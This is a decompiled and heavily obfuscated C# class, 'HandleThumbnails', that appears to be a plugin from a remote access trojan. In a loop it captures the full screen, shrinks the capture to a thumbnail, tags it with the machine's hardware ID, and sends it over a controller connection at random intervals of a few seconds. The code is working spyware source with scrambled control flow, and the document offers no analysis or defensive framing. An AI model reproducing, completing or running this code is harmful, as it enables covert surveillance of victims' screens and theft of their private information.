using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Handler;

public class HandleThumbnails
{
	internal static HandleThumbnails vxfeoGerkQOEi7e1TsS;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleThumbnails()
	{
		Eiks4EeAAgmRSDPptv2();
		base._002Ector();
		int num = 0;
		if (false)
		{
			goto IL_0026;
		}
		goto IL_002a;
		IL_0026:
		int num2;
		num = num2;
		goto IL_002a;
		IL_002a:
		Bitmap bitmap = default(Bitmap);
		Graphics graphics = default(Graphics);
		Rectangle rectangle = default(Rectangle);
		int num7 = default(int);
		int num12 = default(int);
		do
		{
			switch (num)
			{
			default:
				try
				{
					CancellationTokenSource ctsThumbnails = Packet.ctsThumbnails;
					int num3;
					if (ctsThumbnails == null)
					{
						num3 = 5;
						if (false)
						{
							goto IL_0063;
						}
					}
					else
					{
						U7GTjOeTFjCN6sb8J5S(ctsThumbnails, JZGqsP7dTwImnY3EdB.QaxdajGAii);
						num3 = 10;
						if (false)
						{
							num3 = 9;
						}
					}
					goto IL_0067;
					IL_0067:
					while (true)
					{
						switch (num3)
						{
						default:
							goto end_IL_0067;
						case 2:
							U7GTjOeTFjCN6sb8J5S(bitmap, JZGqsP7dTwImnY3EdB.DNNdzmca2H);
							num3 = 6;
							if (false)
							{
								num3 = 0;
							}
							continue;
						case 6:
						case 11:
							if (!lUQjdAyGMWFifoDU8Hn())
							{
								num3 = 3;
								continue;
							}
							goto case 7;
						case 1:
							try
							{
								MemoryStream memoryStream = new MemoryStream();
								int num4 = 0;
								if (false)
								{
									int num5;
									num4 = num5;
								}
								switch (num4)
								{
								default:
									try
									{
										Graphics graphics2 = graphics;
										rectangle = itZj5Dyy3dFiDaqf1yf(Wo1LmSd1CoxaetZ49yc.M2CdmcGqT(Wo1LmSd1CoxaetZ49yc.nihdueDnTU), FDqwqSdviTHjghudnLF.gnqdAmL9cU);
										OuYHDMycHOnt6eY7rjC(graphics2, 0, 0, 0, 0, otkYuldg3ZWseaJ49v0.M2CdmcGqT(ref rectangle, otkYuldg3ZWseaJ49v0.ap6d9KuAuK), CXobLidNNWHUlcVYHw1.aO4dPCmTu0);
										int num6 = 0;
										if (false)
										{
											goto IL_015d;
										}
										goto IL_0161;
										IL_015d:
										num6 = num7;
										goto IL_0161;
										IL_0161:
										while (true)
										{
											switch (num6)
											{
											default:
											{
												object obj = CBONE0yES1x2hYaRTJA(bitmap, 256, 256, (Image.GetThumbnailImageAbort)([MethodImpl(MethodImplOptions.NoInlining)] () => false), IntPtr.Zero);
												YmkRu6yJysli09spXQ1(obj, memoryStream, qvlvZAdbhpsaveTXrQe.M2CdmcGqT(qvlvZAdbhpsaveTXrQe.sESdkCEmII), GMx0nXdWb6Xxdu4ejpL.PS1dXoaKSF);
												MsgPack msgPack = new MsgPack();
												BOD44OyUY1UZvZ8Fgib(y1kkYty2S2xtveophWS(msgPack, vMwu2nyiKd9GsKtd8ef(0)), vMwu2nyiKd9GsKtd8ef(118));
												BOD44OyUY1UZvZ8Fgib(msgPack.ForcePathObject((string)vMwu2nyiKd9GsKtd8ef(644)), Tb5LKIyMnnXQYEOGJcU());
												WViE68yjidunZUBdYdW(y1kkYty2S2xtveophWS(msgPack, vMwu2nyiKd9GsKtd8ef(656)), PAsjaXyR4YICQuDOwFy(memoryStream, teKKAndwBqpJUcRp1Vf.P0gdqHnuZU));
												xEfRUdynU6fGttHTD0Q(msgPack.Encode2Bytes());
												JZGqsP7dTwImnY3EdB.M2CdmcGqT(obj, JZGqsP7dTwImnY3EdB.DNNdzmca2H);
												num6 = 1;
												if (0 == 0)
												{
													continue;
												}
												goto IL_015d;
											}
											case 1:
												break;
											}
											break;
										}
									}
									finally
									{
										int num8;
										if (memoryStream == null)
										{
											num8 = 2;
											if (1 == 0)
											{
												num8 = 2;
											}
											goto IL_026c;
										}
										goto IL_0282;
										IL_026c:
										switch (num8)
										{
										default:
											goto end_IL_024b;
										case 1:
											break;
										case 2:
											goto end_IL_024b;
										case 0:
											goto end_IL_024b;
										}
										goto IL_0282;
										IL_0282:
										U7GTjOeTFjCN6sb8J5S(memoryStream, JZGqsP7dTwImnY3EdB.q4tgwVgEu);
										num8 = 0;
										if (1 == 0)
										{
											int num9;
											num8 = num9;
										}
										goto IL_026c;
										end_IL_024b:;
									}
									break;
								case 1:
									break;
								}
							}
							finally
							{
								int num10;
								if (graphics == null)
								{
									num10 = 0;
									if (1 == 0)
									{
										int num11;
										num10 = num11;
									}
									goto IL_02e8;
								}
								goto IL_02fe;
								IL_02e8:
								switch (num10)
								{
								default:
									goto end_IL_02cc;
								case 1:
									break;
								case 0:
									goto end_IL_02cc;
								case 2:
									goto end_IL_02cc;
								}
								goto IL_02fe;
								IL_02fe:
								U7GTjOeTFjCN6sb8J5S(graphics, JZGqsP7dTwImnY3EdB.q4tgwVgEu);
								num10 = 2;
								goto IL_02e8;
								end_IL_02cc:;
							}
							goto case 2;
						case 3:
							goto end_IL_0067;
						case 7:
							if (XyAkEYmQrC6hk4SPCb.M2CdmcGqT(Packet.ctsThumbnails, XyAkEYmQrC6hk4SPCb.cV7dc3DORd))
							{
								num3 = 0;
								if (0 == 0)
								{
									continue;
								}
								break;
							}
							goto case 8;
						case 8:
							BXlwBBygqRtVwmLVedv(iH9GLKez1IH250sJ7Cn(new Random(), 2500, 7000, nLq8VueHQaE55I0hky.MMv4IMLqs), dm6L8Sddtfk8nZl9TIp.E0Ndx6rYcU);
							num3 = 12;
							continue;
						case 4:
						{
							int width = PWgoKadJDbyfYLlrJJF.M2CdmcGqT(ref rectangle, PWgoKadJDbyfYLlrJJF.E6AdokPnOZ);
							rectangle = itZj5Dyy3dFiDaqf1yf(MgOlXtyeS6eLt4CEJCn(Wo1LmSd1CoxaetZ49yc.nihdueDnTU), FDqwqSdviTHjghudnLF.gnqdAmL9cU);
							bitmap = new Bitmap(width, PWgoKadJDbyfYLlrJJF.M2CdmcGqT(ref rectangle, PWgoKadJDbyfYLlrJJF.gjGdyDfwAd));
							num3 = 9;
							if (0 == 0)
							{
								continue;
							}
							break;
						}
						case 12:
							rectangle = FDqwqSdviTHjghudnLF.M2CdmcGqT(Wo1LmSd1CoxaetZ49yc.M2CdmcGqT(Wo1LmSd1CoxaetZ49yc.nihdueDnTU), FDqwqSdviTHjghudnLF.gnqdAmL9cU);
							num3 = 4;
							continue;
						case 9:
							graphics = (Graphics)PUOsT1y0ekgVDP1VO40(bitmap, k5WhdgdsqeDfsQbI9JO.RCxdYoNf0i);
							num3 = 1;
							if (false)
							{
								num3 = 1;
							}
							continue;
						case 5:
						case 10:
							Packet.ctsThumbnails = new CancellationTokenSource();
							num3 = 11;
							continue;
						case 0:
							goto end_IL_0067;
						}
						goto IL_0063;
						continue;
						end_IL_0067:
						break;
					}
					goto end_IL_0041;
					IL_0063:
					num3 = num12;
					goto IL_0067;
					end_IL_0041:;
				}
				catch
				{
					int num13 = 0;
					if (false)
					{
						int num14;
						num13 = num14;
					}
					switch (num13)
					{
					case 0:
						break;
					}
					return;
				}
				break;
			case 2:
				break;
			case 1:
				return;
			}
			WBoHUoy4STTsvMHhxBA();
			num = 1;
		}
		while (0 == 0);
		goto IL_0026;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Eiks4EeAAgmRSDPptv2()
	{
		WkMgYHbfSUMGdoITRx.f48kVQAz0ZYuA();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void U7GTjOeTFjCN6sb8J5S(object P_0, object P_1)
	{
		JZGqsP7dTwImnY3EdB.M2CdmcGqT(P_0, (JZGqsP7dTwImnY3EdB)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int iH9GLKez1IH250sJ7Cn(object P_0, int P_1, int P_2, object P_3)
	{
		return nLq8VueHQaE55I0hky.M2CdmcGqT(P_0, P_1, P_2, (nLq8VueHQaE55I0hky)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void BXlwBBygqRtVwmLVedv(int P_0, object P_1)
	{
		dm6L8Sddtfk8nZl9TIp.M2CdmcGqT(P_0, (dm6L8Sddtfk8nZl9TIp)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MgOlXtyeS6eLt4CEJCn(object P_0)
	{
		return Wo1LmSd1CoxaetZ49yc.M2CdmcGqT((Wo1LmSd1CoxaetZ49yc)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Rectangle itZj5Dyy3dFiDaqf1yf(object P_0, object P_1)
	{
		return FDqwqSdviTHjghudnLF.M2CdmcGqT(P_0, (FDqwqSdviTHjghudnLF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PUOsT1y0ekgVDP1VO40(object P_0, object P_1)
	{
		return k5WhdgdsqeDfsQbI9JO.M2CdmcGqT((Image)P_0, (k5WhdgdsqeDfsQbI9JO)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void OuYHDMycHOnt6eY7rjC(object P_0, int P_1, int P_2, int P_3, int P_4, Size P_5, object P_6)
	{
		CXobLidNNWHUlcVYHw1.M2CdmcGqT(P_0, P_1, P_2, P_3, P_4, P_5, (CXobLidNNWHUlcVYHw1)P_6);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object CBONE0yES1x2hYaRTJA(object P_0, int P_1, int P_2, object P_3, IntPtr P_4)
	{
		return ((Image)P_0).GetThumbnailImage(P_1, P_2, (Image.GetThumbnailImageAbort)P_3, P_4);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void YmkRu6yJysli09spXQ1(object P_0, object P_1, object P_2, object P_3)
	{
		GMx0nXdWb6Xxdu4ejpL.M2CdmcGqT(P_0, (Stream)P_1, (ImageFormat)P_2, (GMx0nXdWb6Xxdu4ejpL)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object vMwu2nyiKd9GsKtd8ef(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object y1kkYty2S2xtveophWS(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void BOD44OyUY1UZvZ8Fgib(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Tb5LKIyMnnXQYEOGJcU()
	{
		return Connection.Hwid;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PAsjaXyR4YICQuDOwFy(object P_0, object P_1)
	{
		return teKKAndwBqpJUcRp1Vf.M2CdmcGqT(P_0, (teKKAndwBqpJUcRp1Vf)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void WViE68yjidunZUBdYdW(object P_0, object P_1)
	{
		((MsgPack)P_0).SetAsBytes((byte[])P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void xEfRUdynU6fGttHTD0Q(object P_0)
	{
		Connection.Send((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool lUQjdAyGMWFifoDU8Hn()
	{
		return Connection.IsConnected;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void WBoHUoy4STTsvMHhxBA()
	{
		Connection.Disconnected();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool sK3HD0eH4reieq7M6l5()
	{
		return vxfeoGerkQOEi7e1TsS == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleThumbnails mIdgRReVHO6bwA4uBiN()
	{
		return vxfeoGerkQOEi7e1TsS;
	}
}
